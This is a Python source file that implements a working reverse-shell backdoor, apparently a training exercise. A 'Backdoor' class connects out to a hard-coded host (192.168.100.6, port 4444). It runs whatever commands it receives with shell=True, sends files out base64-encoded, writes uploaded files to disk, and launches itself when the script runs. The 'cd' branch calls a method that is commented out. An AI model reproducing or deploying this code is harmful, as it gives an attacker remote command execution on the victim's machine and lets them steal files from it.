import socket 
import subprocess 
import json
import os 
import base64#4*

class Backdoor:
	def __init__(self, ip, port):
		self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.connection.connect((ip,port))


	def safe_send(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data.encode())
	def safe_receive(self):
		json_data = b""
		while True :
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue
        
	# def change_path(self,path):#2*
	# 	try:
	# 		os.chdir(path)
	# 		return "[+] changing path to " + path 
	# 	except FileNotFoundError :
	# 		return "[!] Wrong path: " + path


	def read_file(self,path):#3*
		with open(path,"rb") as file:
			return base64.b64encode(file.read())#4*

	def write_file1(self,path,content):#5*
		with open(path, "wb") as file :
			file.write(base64.b64decode(content))
			return "[+] Upload was successful "

	def run_system_commands(self, command):
		return subprocess.check_output(command,shell = True)

	def run(self):
		while True :
			command = self.safe_receive() 
			try:
				if command[0] == "exit" : #1*
					self.connection.close()#1*
					exit()#1*
				elif command[0] == "cd" and len(command) > 1 :#2*
					# if command[1] == " " :
					# 	print("[+] veuillez ecrire le path ")
					command_result = self.change_path(command[1])#2*
				elif command[0] == "download" :#3*
					command_result = self.read_file(command[1]).decode()#3*
				elif command[0] == "upload":#5*
					command_result = self.write_file1(command[1],command[2])#5*
				elif command[0] == "" :
					command_result = " " #2*
				else :
					command_result = self.run_system_commands(command).decode()#2*
			except Exception:
				command_result = "[-] There is an error on the command "
			self.safe_send(command_result)
		# self.connection.close()


my_backdoor = Backdoor("192.168.100.6",4444)
my_backdoor.run()